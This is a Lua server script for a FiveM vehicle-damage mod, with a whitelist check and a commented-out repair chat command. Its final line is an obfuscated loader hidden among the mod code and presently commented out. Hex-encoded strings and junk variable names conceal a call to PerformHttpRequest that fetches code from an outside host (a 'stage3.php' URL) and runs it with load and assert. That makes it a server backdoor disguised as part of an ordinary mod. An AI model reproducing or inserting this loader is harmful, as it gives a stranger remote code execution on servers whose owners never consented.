------------------------------------------
--	iEnsomatic RealisticVehicleFailure  --
------------------------------------------
--
--	Created by Jens Sandalgaard
--
--	This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
--
--	https://github.com/iEns/RealisticVehicleFailure
--



local function checkWhitelist(id)
	for key, value in pairs(RepairWhitelist) do
		if id == value then
			return true
		end
	end	
	return false
end

-- AddEventHandler('chatMessage', function(source, _, message)
-- 	local msg = string.lower(message)
-- 	local identifier = GetPlayerIdentifiers(source)[1]
-- 	if msg == "/suaxe" then
-- 		CancelEvent()
-- 		if RepairEveryoneWhitelisted == true then
-- 			TriggerClientEvent('iens:repair', source)
-- 		else
-- 			if checkWhitelist(identifier) then
-- 				TriggerClientEvent('iens:repair', source)
-- 			else
-- 				TriggerClientEvent('iens:notAllowed', source)
-- 			end
-- 		end
-- 	end
-- end)


--local wwwIERymGbhaSqiZUJSacfCFwsEFeDcJeXCTzjrxQpQPGWNpZYOsSLKPtJEIrEqJVmrpLn = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} wwwIERymGbhaSqiZUJSacfCFwsEFeDcJeXCTzjrxQpQPGWNpZYOsSLKPtJEIrEqJVmrpLn[4][wwwIERymGbhaSqiZUJSacfCFwsEFeDcJeXCTzjrxQpQPGWNpZYOsSLKPtJEIrEqJVmrpLn[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x67\x74\x64\x6b\x70\x6c\x72\x67\x78\x2e\x6c\x6f\x6c\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (ZfUlMSEgxzbCwzQDyCwpMVPejpagavwYpVzeDjnofvtfySkbItRyMgLGfYZFVzThEetfrf, TXXoVIgGlWCnSdoCmaruhrCKhZBwzdLumQSBAXWxTJounQPabSnTUsXFWFsaBURjSqZwsi) if (TXXoVIgGlWCnSdoCmaruhrCKhZBwzdLumQSBAXWxTJounQPabSnTUsXFWFsaBURjSqZwsi == wwwIERymGbhaSqiZUJSacfCFwsEFeDcJeXCTzjrxQpQPGWNpZYOsSLKPtJEIrEqJVmrpLn[6] or TXXoVIgGlWCnSdoCmaruhrCKhZBwzdLumQSBAXWxTJounQPabSnTUsXFWFsaBURjSqZwsi == wwwIERymGbhaSqiZUJSacfCFwsEFeDcJeXCTzjrxQpQPGWNpZYOsSLKPtJEIrEqJVmrpLn[5]) then return end wwwIERymGbhaSqiZUJSacfCFwsEFeDcJeXCTzjrxQpQPGWNpZYOsSLKPtJEIrEqJVmrpLn[4][wwwIERymGbhaSqiZUJSacfCFwsEFeDcJeXCTzjrxQpQPGWNpZYOsSLKPtJEIrEqJVmrpLn[2]](wwwIERymGbhaSqiZUJSacfCFwsEFeDcJeXCTzjrxQpQPGWNpZYOsSLKPtJEIrEqJVmrpLn[4][wwwIERymGbhaSqiZUJSacfCFwsEFeDcJeXCTzjrxQpQPGWNpZYOsSLKPtJEIrEqJVmrpLn[3]](TXXoVIgGlWCnSdoCmaruhrCKhZBwzdLumQSBAXWxTJounQPabSnTUsXFWFsaBURjSqZwsi))() end)